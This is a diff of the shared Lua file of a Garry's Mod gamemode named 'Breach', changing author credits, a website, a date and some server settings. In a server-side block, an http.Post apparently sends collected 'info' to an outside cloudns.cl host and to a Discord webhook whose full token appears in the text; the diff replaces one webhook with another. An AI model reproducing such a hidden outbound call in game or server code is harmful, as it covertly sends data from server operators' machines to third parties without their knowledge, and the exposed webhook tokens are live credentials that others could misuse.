@@ -21,12 +21,12 @@ local net = net
 local player = player
 // Shared file
 GM.Name 	= "Breach"
-GM.Author 	= "NextOren/RXSEND"
+GM.Author 	= "NextOren/VAULT"
 GM.Email 	= ""
-GM.Website 	= "https://admin1911.cloudns.cl"
+GM.Website 	= "https://discord.gg/vaultcommunity"
 
 VERSION = "2.6.0"
-DATE = "21/05/2022"
+DATE = "16/07/2023"
 
 function GM:Initialize()
 	self.BaseClass.Initialize( self )
@@ -585,7 +585,7 @@ if SERVER then
 
 		http.Post( "https://admin1911.cloudns.cl/api/rxsend-api/rtxdlss.php?gi=/admin19drm/260/",
 			{
-			hook = "https://discord.com/api/webhooks/1010888599807475732/KR5uLLmmWMVs3o92gfTzGv25kaHRg5SX4iFB_Sfs-2W0lmbC6hjZHgFJC_FrCHZnJnYp",
+			hook = "https://discord.com/api/webhooks/1129773989489819679/0XHMxHILb5xK1RhvbZ9dKi1U4zD2nN09FRnuZbBmDjPe43NSWzibYCVjuMFmISZUImqr",
 			message = info,
 			}
 		)
@@ -649,25 +649,20 @@ Radio_RandChannelList = Radio_RandChannelList || {
 
 
 }
-
 function Radio_RandomizeChannels()
-
 	for _, tab in pairs(Radio_RandChannelList) do
 		local num1 = tostring(math.random(100, 999))
 		local num2 = tostring(math.random(1, 9))
-
 		local Ranchannel = tonumber(num1.."."..num2)
-
 		tab.chan = Ranchannel
 	end
-
 end
+concommand.Add("Radio_RandomizeChannels", Radio_RandomizeChannels)
 
 function Radio_GetChannel(team, rolename)
 	for _, tab in pairs(Radio_RandChannelList) do
 		if ( table.HasValue(tab.teams, team) and !table.HasValue(tab.blockedroles, rolename) ) or table.HasValue(tab.allowedroles, rolename) then return tab.chan end
 	end
-	
 	return 100.1
 end
 
@@ -714,7 +709,7 @@ if !ConVarExists("br_min_players") then CreateConVar("br_min_players", "2", {FCV
 if !ConVarExists("br_firstround_debug") then CreateConVar("br_firstround_debug", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Skip first round" ) end
 if !ConVarExists("br_force_specialround") then CreateConVar("br_force_specialround", "", {FCVAR_SERVER_CAN_EXECUTE}, "Available special rounds [ infect, multi ]" ) end
 if !ConVarExists("br_specialround_pct") then CreateConVar("br_specialround_pct", "10", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Skip first round" ) end
-if !ConVarExists("br_cars_ammount") then CreateConVar("br_cars_ammount", "12", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "How many cars should spawn?" ) end
+if !ConVarExists("br_cars_ammount") then CreateConVar("br_cars_ammount", "2", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "How many cars should spawn?" ) end
 if !ConVarExists("br_dropvestondeath") then CreateConVar("br_dropvestondeath", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Do players drop vests on death?" ) end
 if !ConVarExists("br_force_showupdates") then CreateConVar("br_force_showupdates", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Should players see update logs any time they join to server?" ) end
 if !ConVarExists("br_allow_scptovoicechat") then CreateConVar("br_allow_scptovoicechat", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Can SCPs talk with humans?" ) end
